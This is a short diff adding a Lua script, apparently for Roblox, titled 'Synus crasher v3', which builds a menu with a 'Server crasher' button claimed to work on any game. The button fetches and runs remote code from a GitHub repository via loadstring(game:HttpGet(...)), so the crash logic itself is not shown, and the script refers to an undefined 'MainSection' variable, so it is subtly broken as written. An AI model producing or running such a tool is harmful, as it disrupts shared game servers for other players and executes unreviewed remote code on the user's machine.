@@ -1,0 +1,11 @@
+--made by rodizzy#2011
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Synus crasher v3", "DarkTheme")
+
+local main = Window:NewTab("Crasher")
+local main = main:NewSection("Crashing")
+
+
+MainSection:NewButton("Server crasher", "Server crasher made by rodizzy#2011 betterdahood#0001 works on any game", function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/BetterDaHood/BetterDaHoodCrasher/main/Crash'))()
+end)
